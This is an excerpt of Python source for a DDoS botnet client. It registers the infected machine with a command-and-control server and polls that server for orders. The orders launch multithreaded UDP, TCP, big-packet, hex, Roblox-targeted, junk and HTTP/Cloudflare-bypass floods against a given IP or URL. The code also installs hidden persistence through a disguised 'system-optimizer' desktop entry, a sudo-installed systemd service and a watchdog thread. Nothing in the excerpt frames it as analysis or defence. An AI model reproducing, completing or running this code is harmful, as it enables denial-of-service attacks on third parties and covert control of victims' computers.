...
import os, json, sys, subprocess, shutil, platform, hashlib
from datetime import datetime

C2_URL      = "https://congenial-meme-974qvw975944fr44-5000.app.github.dev/"        
AUTH_TOKEN  = "daylachuoibimatrandom123456789"
POLL_INTERVAL = 6

BOT_ID = f"bot_{random.randint(1,999)}"

LOCK_FILE = os.path.join(os.getenv("TEMP", "/tmp"), f"{BOT_ID}.lock")
...
def CFB(url, end_time, port=80):
    scraper = cloudscraper.create_scraper()
    target = f"{url}:{port}"
    while time.time() < end_time:
        try:
            scraper.get(target, headers={'User-Agent': rand_ua()}, timeout=6)
            scraper.head(target, headers={'User-Agent': rand_ua()}, timeout=6)
        except:
            pass

def REQ_attack(url, end_time, port=80):
    s = requests.Session()
    target = f"{url}:{port}"
    while time.time() < end_time:
        try:
            s.get(target, headers={'User-Agent': rand_ua()}, timeout=6)
            s.head(target, headers={'User-Agent': rand_ua()}, timeout=6)
        except:
            pass
...
def attack_bigpacket(ip, port, end_time, size_kb=1024):
    payload = b"\x00" * (size_kb * 1024)
    log_interval = 3  # mỗi 3 giây log 1 lần
    next_log = time.time() + log_interval

    print(f"[BIGPACKET] Started → {ip}:{port} | Payload = {size_kb}KB")
        ...
        try:
            ...
            while time.time() < end_time:
                ...
                if time.time() >= next_log:
                    print(f"[BIGPACKET] Sending data → {ip}:{port}")
                    next_log = time.time() + log_interval

            s.close()

        except Exception as e:
            print(f"[BIGPACKET] Error: {e}")
            pass

    print(f"[BIGPACKET] Finished attack → {ip}:{port}")
...
def attack_roblox(ip, port, end_time, size):
    while time.time() < end_time:
        try:
            ...
            dport = random.randint(1, 65535) if port == 0 else port
            for _ in range(80):
                hex_part = format(random.randrange(10**80), '064x')[:64]
                s.sendto(bytes.fromhex(hex_part) + data, (ip, dport))
            s.close()
        except:
            pass
...
def register():
    try:
        info = {
            ...
            "public_ip": session.get("https://api.ipify.org", timeout=6).text,
            "local_ip": socket.gethostbyname(socket.gethostname()),
            "os": platform.system(),
            "arch": platform.machine(),
            "pid": os.getpid()
        }
        session.post(f"{C2_URL}/register", json={"bot_id": BOT_ID, "info": info}, timeout=10)
...
def get_command():
    try:
        r = session.get(f"{C2_URL}/command/{BOT_ID}", timeout=10)
...
def persistence():
    ...
    if platform.system() == "Windows":
        ...
        if not os.path.exists(target) or get_file_hash(target) != current_hash:
            try:
        ...
        desktop_file = os.path.join(desktop_dir, "system-optimizer.desktop")
...
WantedBy=multi-user.target"""
            with open("/tmp/sysopt.service", "w") as f:
                f.write(service)
            os.system("sudo cp /tmp/sysopt.service /etc/systemd/system/ && sudo systemctl daemon-reload && sudo systemctl enable sysopt.service >/dev/null 2>&1")
        except:
            pass
...
<dict>
    ...
    <array><string>{current_path}</string></array>
...
def watchdog_thread():
    ...
    while True:
        time.sleep(12)
        if not is_internet() or not os.path.exists(LOCK_FILE):
            remove_lock()
...
def execute_task(task):
    ...
    args = task.get("args", {})
    threads = args.get("threads", 120)

    end_time = time.time() + int(args.get("time", 60))

    if cmd == "!UDP":
        for _ in range(threads):
            threading.Thread(target=attack_udp, args=(args["ip"], int(args["port"]), end_time, int(args.get("size", 65000))), daemon=True).start()

    elif cmd == "!TCP":
        for _ in range(threads):
            threading.Thread(target=attack_tcp, args=(args["ip"], int(args["port"]), end_time, int(args.get("size", 65000))), daemon=True).start()

    elif cmd == "!BIGPACKET":
            payload_size = int(args.get("size", 1024)) 
            for _ in range(threads):
                threading.Thread(
                    target=attack_bigpacket,
                    args=(args["ip"], int(args["port"]), end_time, payload_size),
                    daemon=True
                ).start()

    elif cmd == "!HEX":
        for _ in range(threads):
            threading.Thread(target=attack_hex, args=(args["ip"], int(args["port"]), end_time), daemon=True).start()

    elif cmd == "!ROBLOX" or cmd == ".ROBLOX":
        for _ in range(threads):
            threading.Thread(target=attack_roblox, args=(args["ip"], int(args["port"]), end_time, int(args.get("size", 65000))), daemon=True).start()

    elif cmd == "!JUNK":
        for _ in range(threads):
            threading.Thread(target=attack_junk, args=(args["ip"], int(args["port"]), end_time), daemon=True).start()

    elif cmd == ".HTTP_REQ":
        for _ in range(threads):
            threading.Thread(target=REQ_attack, args=(args["url"], end_time, args.get("port", 80)), daemon=True).start()

    elif cmd == ".HTTP_CFB" or cmd == "!HTTP_CFB":
        for _ in range(threads):
            threading.Thread(target=CFB, args=(args["url"], end_time, args.get("port", 80)), daemon=True).start()
...
def main():
    ...
    while True:
        task = get_command()
        if task:
            print(f"[+] Task received → {task['command']}")
            threading.Thread(target=execute_task, args=(task,), daemon=True).start()
        time.sleep(POLL_INTERVAL + random.uniform(0, 4))
